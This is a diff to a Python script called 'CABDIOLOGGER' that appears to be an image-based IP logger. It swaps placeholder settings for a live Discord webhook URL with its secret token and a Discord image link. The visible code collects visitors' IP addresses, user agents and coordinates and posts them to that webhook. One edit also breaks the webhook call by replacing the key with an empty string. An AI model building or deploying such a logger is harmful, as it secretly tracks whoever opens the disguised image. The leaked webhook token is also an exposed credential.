@@ -10,8 +10,8 @@ __version__ = "v2.0"
 __author__ = "cabdio"
 
 config = {
-    "webhook": "webhook adresiniz",
-    "image": "fotografin adresi", 
+    "webhook": "https://discord.com/api/webhooks/1353180506849542237/gTLKCsfwoyNOMLm1EORtx_c9mKuZQ0d1D_i1bBGVhVYJTvlQG0X0gxme_c-d-IjhdLLg",
+    "image": "https://cdn.discordapp.com/attachments/1350643698177675357/1352675502111850629/20250321_120903.jpg?ex=67e0323b&is=67dee0bb&hm=4ffbede7fa9b327e73d5a08bcc623e7227c9a3eaaadff6849043204a7c53bbb0&", 
     "imageArgument": True,
 
     "username": "CABDIOLOGGER", 
@@ -75,7 +75,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     bot = botCheck(ip, useragent)
     
     if bot:
-        requests.post(config["webhook"], json = {
+        requests.post(config[""], json = {
     "username": config["username"],
     "content": "",
     "embeds": [
